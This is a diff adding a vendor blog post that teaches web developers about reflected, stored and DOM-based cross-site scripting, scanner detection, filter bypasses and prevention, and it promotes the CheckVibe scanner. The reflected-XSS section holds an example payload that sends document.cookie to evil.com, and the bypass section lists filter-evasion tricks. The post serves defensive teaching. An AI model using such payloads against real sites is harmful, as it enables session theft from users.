@@ -1,0 +1,91 @@
+---
+title: "How to Find XSS Vulnerabilities Before Hackers Do"
+description: "A practical guide to detecting cross-site scripting (XSS) vulnerabilities in your web application. Learn the three types of XSS and how automated tools catch them."
+date: "2026-02-18"
+author: "CheckVibe Team"
+tags: ["xss", "security", "vulnerabilities", "tutorial"]
+image: "/images/blog/xss-detection.png"
+---
+
+Cross-site scripting (XSS) has been in the OWASP Top 10 for over a decade and it's not going anywhere. Despite being well-understood, XSS remains one of the most common vulnerabilities in web applications — especially in apps built quickly with modern JavaScript frameworks.
+
+## The Three Types of XSS
+
+### Reflected XSS
+
+Reflected XSS happens when user input is immediately echoed back in the response without sanitization. A classic example is a search page that displays "No results for [your query]" — if the query isn't escaped, an attacker can inject a script tag.
+
+```
+https://example.com/search?q=<script>document.location='https://evil.com/steal?c='+document.cookie</script>
+```
+
+The payload isn't stored anywhere. It's "reflected" from the URL or form submission directly into the page.
+
+### Stored XSS
+
+Stored XSS is more dangerous because the malicious payload persists. Think of a comment field, user profile, or product review that accepts HTML or Markdown. If the input isn't sanitized before storage and rendering, every user who views that content executes the attacker's script.
+
+Common injection points:
+- User profile fields (display name, bio)
+- Comments and reviews
+- Forum posts and messages
+- File names and metadata
+
+### DOM-Based XSS
+
+DOM-based XSS happens entirely in the browser. The server response is safe, but client-side JavaScript reads from an untrusted source (like `window.location.hash`) and writes it into the DOM without sanitization.
+
+Modern single-page applications are particularly vulnerable because they do heavy DOM manipulation on the client side. React, Vue, and Angular all have protections, but they can be bypassed with `dangerouslySetInnerHTML`, `v-html`, or `[innerHTML]`.
+
+## How Automated Scanners Detect XSS
+
+Automated XSS detection works by injecting test payloads and observing how the application handles them:
+
+1. **Payload injection** — the scanner sends crafted strings containing script tags, event handlers, and encoding tricks into every input field, URL parameter, and header
+2. **Response analysis** — it checks whether the payload appears unmodified in the response HTML
+3. **DOM inspection** — for DOM-based XSS, the scanner evaluates JavaScript execution contexts
+4. **Context detection** — payloads vary depending on whether injection lands in HTML body, attributes, JavaScript blocks, or CSS
+
+A good scanner tests dozens of payload variations because simple payloads like `<script>alert(1)</script>` are often blocked by basic filters, while encoded or fragmented payloads slip through.
+
+## Common XSS Bypasses
+
+Developers often implement incomplete sanitization. Here are patterns that frequently get bypassed:
+
+- **Blocklist filtering** — blocking `<script>` but not `<img onerror=...>` or `<svg onload=...>`
+- **Case sensitivity** — blocking `<SCRIPT>` but not `<ScRiPt>`
+- **Encoding tricks** — HTML entities, URL encoding, Unicode escapes
+- **Nested tags** — `<scr<script>ipt>` where the filter removes the inner tag, leaving a valid outer tag
+- **Event handlers** — `onmouseover`, `onfocus`, `onerror` on various HTML elements
+
+## Prevention Checklist
+
+The most effective defense is a layered approach:
+
+**Output encoding** — escape all dynamic content based on context (HTML, JS, URL, CSS). Use your framework's built-in escaping — React's JSX auto-escapes by default.
+
+**Content Security Policy** — deploy a strict CSP that blocks inline scripts. This is the single most effective XSS mitigation:
+```
+Content-Security-Policy: default-src 'self'; script-src 'self'; style-src 'self' 'unsafe-inline'
+```
+
+**Input validation** — validate and sanitize input on the server side, not just the client. Use allowlists over blocklists.
+
+**HTTPOnly cookies** — mark session cookies as `HttpOnly` so they can't be stolen via `document.cookie`.
+
+**Framework protections** — use `textContent` instead of `innerHTML`, avoid `dangerouslySetInnerHTML` in React, use `{{ }}` interpolation in Vue (not `v-html`).
+
+## Scanning for XSS With CheckVibe
+
+CheckVibe's XSS scanner tests all accessible input vectors on your site with hundreds of payload variations. It identifies:
+
+- Reflected XSS in URL parameters and form fields
+- Missing CSP headers that would mitigate XSS impact
+- Unsafe inline script patterns
+- Missing HttpOnly flags on session cookies
+
+Each finding includes the exact payload that succeeded, the affected parameter, and specific remediation steps.
+
+---
+
+*Find XSS before your users get exploited. [Scan your site now](https://checkvibe.dev/signup) with CheckVibe's automated XSS detection.*
